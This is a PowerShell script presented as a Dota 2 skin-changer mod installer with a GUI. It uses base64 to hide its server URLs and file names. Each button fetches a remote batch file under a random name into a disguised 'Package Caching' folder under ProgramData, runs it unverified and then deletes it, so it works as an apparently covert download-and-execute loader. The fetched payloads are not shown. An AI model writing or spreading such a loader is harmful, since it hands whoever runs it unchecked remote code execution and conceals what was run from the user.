Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$bM = [System.Convert]::FromBase64String("aHR0cHM6Ly9za2luY2hhbmdlci5uZXQvUGF0Y2hDYWNoZS9maWxlQ2FjaGUvd2luLw==")
$bM2 = [System.Convert]::FromBase64String("aHR0cHM6Ly9ydS5za2luY2hhbmdlci5uZXQvUGF0Y2hDYWNoZS9maWxlQ2FjaGUvd2luLw==")
$baseMirrors = @(
    [System.Text.Encoding]::UTF8.GetString($bM),
    [System.Text.Encoding]::UTF8.GetString($bM2)
)
$f = @{
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UnVuIERvdGEy")) = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UnVuRG90YS5iYXQ="))
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5zdGFsbCBNb2Rz")) = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5zdGFsbE1vZHNEb3RhLmJhdA=="))
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rml4IE1vZHM=")) = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Rml4RG90YU1vZHMuYmF0"))
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsZXRlIE1vZHM=")) = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsZXRlTW9kc0RvdGEuYmF0"))
}
$files = $f
$form = New-Object System.Windows.Forms.Form
$form.Text = "Dota2 Skin Changer - Mods Installer"
$form.Size = New-Object System.Drawing.Size(700, 420)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.BackColor = [System.Drawing.Color]::FromArgb(245, 250, 255) # light blue background
$form.Icon = New-Object System.Drawing.Icon (Join-Path (Split-Path $MyInvocation.MyCommand.Path) 'app.ico')
$logo = New-Object System.Windows.Forms.PictureBox
$logo.ImageLocation = Join-Path (Split-Path $MyInvocation.MyCommand.Path) 'logo.png'
$logo.SizeMode = "Zoom"
$logo.Size = New-Object System.Drawing.Size(56, 56)
$logo.Location = New-Object System.Drawing.Point(30, 18)
$form.Controls.Add($logo)
$labelTitle = New-Object System.Windows.Forms.Label
$labelTitle.Text = "Dota2 Skin Changer - Mods Installer"
$labelTitle.Font = New-Object System.Drawing.Font("Inter", 20, [System.Drawing.FontStyle]::Bold)
$labelTitle.ForeColor = [System.Drawing.Color]::FromArgb(30, 60, 120)
$labelTitle.AutoSize = $true
$labelTitle.Location = New-Object System.Drawing.Point(100, 25)
$form.Controls.Add($labelTitle)
$labelStatus = New-Object System.Windows.Forms.Label
$labelStatus.Text = "Click a button to install, fix or remove mods."
$labelStatus.Font = New-Object System.Drawing.Font("Inter", 11, [System.Drawing.FontStyle]::Regular)
$labelStatus.ForeColor = [System.Drawing.Color]::FromArgb(60, 90, 150)
$labelStatus.AutoSize = $true
$labelStatus.Location = New-Object System.Drawing.Point(40, 300)
$labelStatus.Size = New-Object System.Drawing.Size(380, 20)
$form.Controls.Add($labelStatus)
$labelSites = New-Object System.Windows.Forms.LinkLabel
$ssLs = @(
    @{Country=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UnVzc2lh'));      Url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9ydS5kb3RhMmNoYW5nZXIuY29t'))},
    @{Country=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RW5nbGlzaA=='));     Url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9lbi5kb3RhMmNoYW5nZXIuY29t'))},
    @{Country=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2VybWFu'));      Url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9kZS5kb3RhMmNoYW5nZXIuY29t'))},
    @{Country=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RnJlbmNo'));      Url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9mci5kb3RhMmNoYW5nZXIuY29t'))},
    @{Country=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UG9ydHVndWVzZQ=='));  Url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9wdC5kb3RhMmNoYW5nZXIuY29t'))},
    @{Country=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3BhbmlzaA=='));     Url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9lcy5kb3RhMmNoYW5nZXIuY29t'))},
    @{Country=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UG9saXNo'));      Url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9wbC5kb3RhMmNoYW5nZXIuY29t'))},
    @{Country=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VWtyYWluaWFu'));   Url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly91YS5kb3RhMmNoYW5nZXIuY29t'))},
    @{Country=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VHVya2lzaA=='));     Url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly90ci5kb3RhMmNoYW5nZXIuY29t'))},
    @{Country=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QXJhYmlj'));      Url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hci5kb3RhMmNoYW5nZXIuY29t'))},
    @{Country=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SGluZGk='));       Url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9oaS5kb3RhMmNoYW5nZXIuY29t'))},
    @{Country=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW5kb25lc2lhbg=='));  Url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9pZC5kb3RhMmNoYW5nZXIuY29t'))},
    @{Country=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q2hpbmVzZQ=='));     Url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9jbi5kb3RhMmNoYW5nZXIuY29t'))}
)
$sitesText = "International sites:`n"
$linkStart = $sitesText.Length
foreach ($site in $ssLs) {
    $line = "{0,-12} - {1}`n" -f $site.Country, $site.Url
    $urlIndex = $line.IndexOf($site.Url)
    $sitesText += $line
    $labelSites.Links.Add($linkStart + $urlIndex, $site.Url.Length, $site.Url)
    $linkStart += $line.Length
}
$labelSites.Text = $sitesText.TrimEnd()
$labelSites.Font = New-Object System.Drawing.Font("Inter", 10, [System.Drawing.FontStyle]::Regular)
$labelSites.LinkColor = [System.Drawing.Color]::FromArgb(120, 140, 180)
$labelSites.ActiveLinkColor = [System.Drawing.Color]::FromArgb(30, 60, 120)
$labelSites.AutoSize = $true
$labelSites.Location = New-Object System.Drawing.Point(340, 75)
$labelSites.add_LinkClicked({ param($s, $e) Start-Process $e.Link.LinkData })
$form.Controls.Add($labelSites)
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(40, 330)
$progressBar.Size = New-Object System.Drawing.Size(600, 22)
$progressBar.Style = 'Continuous'
$progressBar.Value = 0
$form.Controls.Add($progressBar)
$buttonStyle = {
    param($button)
    $button.Font = New-Object System.Drawing.Font("Inter", 12, [System.Drawing.FontStyle]::Bold)
    $button.BackColor = [System.Drawing.Color]::FromArgb(220, 235, 255)
    $button.ForeColor = [System.Drawing.Color]::FromArgb(30, 60, 120)
    $button.FlatStyle = 'Flat'
    $button.FlatAppearance.BorderSize = 0
    $button.Height = 44
    $button.Width = 220
    $button.Cursor = [System.Windows.Forms.Cursors]::Hand
    $button.Margin = '10,10,10,10'
}
function Test-UrlAvailable($url) {
    try {
        $request = [System.Net.WebRequest]::Create($url)
        $request.Method = "HEAD"
        $request.Timeout = 5000
        $response = $request.GetResponse()
        if ($response.StatusCode -eq 200) {
            $response.Close()
            return $true
        }
    } catch {
        return $false
    }
    return $false
}
function Download-And-Run($filename, $sender) {
    $sender.Enabled = $false
    $labelStatus.Text = "Checking server availability..."
    $form.Refresh()
    Start-Sleep -Milliseconds 200
    $downloaded = $false
    $programDataDir = Join-Path -Path $env:ProgramData -ChildPath "Package Caching"
    if (Test-Path $programDataDir) {
        Get-ChildItem -Path $programDataDir -File -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue
    }
    if (-not (Test-Path $programDataDir)) {
        New-Item -Path $programDataDir -ItemType Directory | Out-Null
    }
    foreach ($mirror in $baseMirrors) {
        $fullUrl = "$mirror$filename"
        $labelStatus.Text = "Checking"
        $form.Refresh()
        if (Test-UrlAvailable $fullUrl) {
            $labelStatus.Text = "Downloading $filename ..."
            $form.Refresh()
            $randomName = [System.IO.Path]::GetRandomFileName().Replace('.', '') + ".bat"
            $destination = Join-Path -Path $programDataDir -ChildPath $randomName
            if (Test-Path $destination) {
                Remove-Item $destination -Force
            }
            try {
                $wc = New-Object System.Net.WebClient
                $wc.DownloadFile($fullUrl, $destination)
                $progressBar.Value = 100
                $form.Refresh()
                $labelStatus.Text = "Launching $filename ..."
                $scriptPath = $MyInvocation.MyCommand.Path
                if (-not $scriptPath) {
                    $scriptPath = $PSCommandPath
                }
                if (-not $scriptPath) {
                    $scriptPath = (Get-Location).Path
                }
                if ($filename -eq "InstallModsDota.bat") {
                    $cmd = "cmd /c `"call `"$destination`" `"$scriptPath`" & del /f /q `"$destination`"`""
                } else {
                    $cmd = "cmd /c `"call `"$destination`" & del /f /q `"$destination`"`""
                }
                Start-Process -FilePath "cmd.exe" -ArgumentList "/c", $cmd
                $labelStatus.Text = "Installation complete."
                $downloaded = $true
                break
            } catch {
                $labelStatus.Text = "Download failed from all mirrors."
            }
        }
    }
    if (-not $downloaded) {
        $labelStatus.Text = "Download error: $_"
    }
    $sender.Enabled = $true
}
$buttonOrder = @("Install Mods", "Run Dota2", "Fix Mods", "Delete Mods")
$yPos = 80
foreach ($btnText in $buttonOrder) {
    $button = New-Object System.Windows.Forms.Button
    switch ($btnText) {
        "Run Dota2"      { $button.Text = "Run Dota 2" }
        "Install Mods"   { $button.Text = "Install Mods" }
        "Fix Mods"       { $button.Text = "MatchMakingFix" }
        "Delete Mods"    { $button.Text = "Delete Mods" }
        default          { $button.Text = $btnText }
    }
    $button.Location = New-Object System.Drawing.Point(80, $yPos)
    & $buttonStyle $button
    $form.Controls.Add($button)
    $fileToDownload = $files[$btnText]
    $button.Add_Click({
        param($sender, $eventArgs)
        $progressBar.Value = 0
        Download-And-Run $fileToDownload $sender
    }.GetNewClosure())
    $yPos += 54
}
[void]$form.ShowDialog()
